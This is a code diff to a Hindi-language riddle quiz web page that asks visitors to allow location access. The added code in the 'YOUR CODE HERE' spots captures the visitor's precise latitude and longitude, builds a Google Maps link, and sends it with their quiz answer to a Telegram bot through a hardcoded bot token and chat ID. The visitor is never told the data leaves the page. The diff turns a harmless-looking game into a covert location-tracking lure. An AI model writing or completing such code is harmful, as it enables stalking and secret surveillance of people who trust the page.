@@ -58,6 +58,12 @@ border:none;
 border-radius:15px;
 font-size:18px;
 cursor:pointer;
+background: rgba(255, 255, 255, 0.1);
+color: white;
+transition: background 0.3s;
+}
+.option:hover {
+background: rgba(255, 255, 255, 0.2);
 }
 </style>
 </head>
@@ -71,20 +77,26 @@ cursor:pointer;
 Allow Location
 </button>
 </div>
+
 <script>
-  let userLocation = "";
+let userLocation = "लोकेशन उपलब्ध नहीं है";
+
 function requestLocation(){
 navigator.geolocation.getCurrentPosition(
 function(position){
-// YOUR CODE HERE
-// लोकेशन मिलने पर जो करना हो यहाँ जोड़ सकते हो
+// लोकेशन डेटा को वेरिएबल में स्टोर करना
+const lat = position.coords.latitude;
+const lon = position.coords.longitude;
+userLocation = `Latitude: ${lat}, Longitude: ${lon}\nGoogle Maps: https://www.google.com/maps?q=${lat},${lon}`;
 showRiddle();
 },
 function(){
 alert("लोकेशन परमिशन नहीं मिली");
+showRiddle(); // परमिशन न मिलने पर भी पहेली दिखाएगा
 }
 );
 }
+
 async function sendToTelegram(message){
 const BOT_TOKEN = "8800918030:AAFLTzIJqwIiYSYG9h3m1IapfVSTe_AgyrE";
 const CHAT_ID = "8064366990";
@@ -111,23 +123,27 @@ document.getElementById("app").innerHTML = `
 <div class="text">
 ऐसी कौन सी चीज़ है जो पानी पीते ही मर जाती है?
 </div>
-<button class="option" onclick="checkAnswer(0)">
+<button class="option" onclick="checkAnswer(0, 'आग')">
 आग
 </button>
-<button class="option" onclick="checkAnswer(1)">
+<button class="option" onclick="checkAnswer(1, 'पेड़')">
 पेड़
 </button>
-<button class="option" onclick="checkAnswer(2)">
+<button class="option" onclick="checkAnswer(2, 'मछली')">
 मछली
 </button>
-<button class="option" onclick="checkAnswer(3)">
+<button class="option" onclick="checkAnswer(3, 'हवा')">
 हवा
 </button>
 `;
 }
-function checkAnswer(choice){
+
+function checkAnswer(choice, optionText){
 let correct = 0;
+let answerStatus = "";
+
 if(choice === correct){
+answerStatus = "सही उत्तर";
 document.getElementById("app").innerHTML = `
 <h1 class="title">✅ सही उत्तर</h1>
 <div class="text">
@@ -139,6 +155,7 @@ Continue
 `;
 }
 else{
+answerStatus = "गलत उत्तर";
 document.getElementById("app").innerHTML = `
 <h1 class="title">❌ गलत उत्तर</h1>
 <div class="text">
@@ -149,10 +166,12 @@ Continue
 </button>
 `;
 }
-// YOUR CODE HERE
-// उत्तर मिलने पर जो करना हो यहाँ जोड़ सकते हो
 
+// टेलीग्राम पर संदेश भेजने की तैयारी
+const messageToSend = `📌 *नया रिस्पॉन्स*\n\n📍 लोकेशन:\n${userLocation}\n\n🧠 यूज़र का जवाब: ${optionText} (${answerStatus})`;
+sendToTelegram(messageToSend);
 }
+
 function showThanks(){
 document.getElementById("app").innerHTML = `
 <h1 class="title">
